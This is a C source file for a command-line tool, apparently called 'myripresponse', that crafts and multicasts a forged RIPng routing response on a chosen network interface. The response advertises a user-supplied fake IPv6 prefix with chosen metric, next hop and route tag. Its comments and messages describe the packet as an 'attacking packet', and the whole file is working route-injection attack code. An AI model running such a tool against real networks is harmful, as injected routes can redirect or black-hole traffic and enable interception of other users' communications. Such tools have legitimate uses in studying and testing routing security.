#include <stdlib.h>
#include <stdio.h>
#include <getopt.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <errno.h>
#include <unistd.h>
#include "myriplib.h"


int main (int argc, char *argv[]) {

    int opt, ifnd = 0, rfnd = 0, nfnd = 0;
    char *interface;
    u_int if_index, hops = 255;
    char *fake_addr, *nexthop;

    /*
        Set implicit values
    */
    int prefix, metric = 1, route_tag = 0;
    nexthop = "::";

    /*
        Check command line paramaters
    */
    while ((opt = getopt(argc, argv, ":hi:r:m:n:t:")) != -1) {
        switch(opt) {
            case 'h':
                printf("Usage:\n\tsudo ./myripresponse -i <interface> -r <IPv6>/[16-128] {-n <IPv6>}\n");
                printf("\t\t\t     {-m [0-16]} {-t [0-65535]}\n\n");
                printf("Parameters in {} are optional, if not specified default values will be used.\n\n");
                exit(-1);

            case 'i':
                interface = optarg;
                /*
                    Get interface index, index is used to set socket option IPV6_MULTICAST_IF
                */
                if_index = if_nametoindex(interface);
                ifnd = 1;
                break;

            case 'r':
                rfnd = 1;
                char *token;
                token = strtok(optarg, "/");
                
                fake_addr = token;
                /*
                    Check whether the entered IPv6 address is valid
                */
                if (valid_ip6(fake_addr) == 0) {
                    fprintf(stderr, "Invalid network address, expecting format <IPv6>/prefix_len.\n");
                    exit(-1);
                }

                if ((token = strtok(NULL, "/")) == NULL) {
                    fprintf(stderr, "Invalid network address, expecting format <IPv6>/prefix_len.\n");
                    exit(-1);
                }
                prefix = strtol(token, NULL, 10);
                /*
                    Prefix value can be between 16 and 128 inclusive
                */
                if (prefix > 128 || prefix < 16) {
                    fprintf(stderr, "Prefix length must be between 16 and 128.\n");
                    exit(-1);
                }
                break;

            case 'm':
                metric = strtol(optarg, NULL, 10);
                /*
                    Metric value can be between 0 and 16 inclusive
                */
                if (metric < 0 || metric > 16) {
                    fprintf(stderr, "Metric must be between 0 and 16.\n");
                    exit(-1);
                }
                break;

            case 'n':
                nfnd = 1;
                nexthop = optarg;
                if (valid_ip6(nexthop) == 0) {
                    fprintf(stderr, "Entered next hop adress is not valid IPv6 adress. For help try -h.\n");
                    exit(-1);   
                }
                break;

            case 't':
                route_tag = strtol(optarg, NULL, 10);
                /*
                    Route tag value can be between 0 and 65535 inclusive
                */
                if (route_tag < 0 || route_tag > 65535) {
                    fprintf(stderr, "Router tag must be between 0 and 65535.\n");
                    exit(-1);
                }
                break;

            case ':':
                fprintf(stderr, "Argument -%c is missing value.\n", optopt);
                exit(-1);

            default:
                fprintf(stderr, "Invalid arguments have been entered.\n");
                exit(-1);
        }
    }

    if (!ifnd && !rfnd) {
        fprintf(stderr, "Parameters -i and -r not found. For help try -h.\n");
        exit(-1);
    }

    if (ifnd == 0) {
        fprintf(stderr, "Interface is required. For help try ./myripresponse -h\n");
        exit(-1);
    }

    if (rfnd == 0) {
        fprintf(stderr, "Advertised route not specified with -r. For help try ./myripresponse -h\n");
        exit(-1);
    }

    int sock;
    struct sockaddr_in6 dest, local;
    struct ripng packet;

    /*
        Sender information:
            port: 521
            address: link-local address of specified interface
    */
    memset(&local, 0, sizeof(struct sockaddr_in6));
    local.sin6_family = AF_INET6;
    local.sin6_port = htons(RIPNG_PORT);
    local.sin6_addr = in6addr_any;

    /*
        Destination information:
            port: 521
            address: ff02::9 (RIPng multicast address)
    */
    memset(&dest, 0, sizeof(struct sockaddr_in6));
    dest.sin6_family = AF_INET6;
    dest.sin6_port = htons(RIPNG_PORT);
    inet_pton(AF_INET6, RIP_MULT, &dest.sin6_addr);
    
    /*
        Create UDP, IPv6 socket
    */
    if ((sock = socket(AF_INET6, SOCK_DGRAM, 0)) == -1) {
        perror("socket() failed");
        exit(-1);
    }

    /*
        Set socket option SO_BINDTODEVICE which binds socket to interface
    */
    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, interface, strlen(interface)) != 0) {
        perror("setsockopt() failed");
        exit(-1);
    }
    /*
        Set socket option IPv6_MULTICAST_IF which sets device for outgoing packets on the socket 
    */
    if (setsockopt(sock, IPPROTO_IPV6,IPV6_MULTICAST_IF, &if_index, sizeof(if_index)) != 0) {
        perror("setsockopt() failed");
        exit(-1);
    }

    /*
        Set socket option IPV6_MULTICAST_HOPS which sets the multicast hop limit for the socket
    */
    if (setsockopt(sock, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &hops, sizeof(hops)) != 0) {
        perror("setsockopt() failed");
        exit(-1);
    }

    /*
        Bind socket to source ip address and port
    */
    if (bind(sock, (struct sockaddr *)&local, sizeof(local)) != 0) {
        perror("bind failed()");
        exit(-1);
    }

    /*
        Craft attacking packet with specified information
    */
    craft_attacking_packet(&packet, nexthop, fake_addr, route_tag, prefix, metric);

    /*
        Send attacking packet to it's destination
    */
    if (sendto(sock, (const void *)&packet, sizeof(packet), 0, (const struct sockaddr *)&dest, INET6_ADDRSTRLEN) <= 0) {
        perror("sendto() failed");
        exit(-1);
    }

    /*
        Close socket after sending the packet
    */
    close(sock);

    printf("Attacking packet succesfully sent.\n");
    printf("\tOutgoing interface: %s\n", interface);
    printf("\tAdvertised network: %s/%d\n", fake_addr, prefix);
    printf("\tNext hop route: %s", nexthop);
    if (nfnd && (!is_linklocal(nexthop))) {
        printf(" --Note that the address %s will not be inserted to routing table as next hop address due to not being link-local.", nexthop);
    }
    printf("\n\tRoute tag: %d\n", route_tag);
    printf("\tMetric: %d\n", metric);

    return 1;
}